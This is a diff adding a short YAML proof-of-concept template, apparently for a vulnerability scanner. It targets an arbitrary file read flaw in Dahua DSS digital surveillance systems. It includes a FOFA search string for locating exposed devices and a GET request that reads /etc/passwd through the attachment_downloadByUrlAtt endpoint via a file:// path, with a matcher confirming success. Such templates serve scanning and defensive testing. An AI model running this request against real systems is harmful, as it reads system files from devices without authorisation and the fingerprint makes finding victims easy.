@@ -1,0 +1,16 @@
+id: poc-yaml-dahua-dss-attachment-downloadbyurlatt-file-read
+info:
+  name: 大华DSS数字监控系统 attachment_downloadByUrlAtt 任意文件读取漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件读取
+  finger: 大华 DSS 数字监控系统
+  fofa: app="dahua-DSS"
+requests:
+- method: GET
+  path: /portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd
+  expression: "status_code == 200 && \nmatches(body,\"root:.*:0:0:\") && \n!contains(body,\"\
+    <\")\n"
+variables: {}
+transport: http
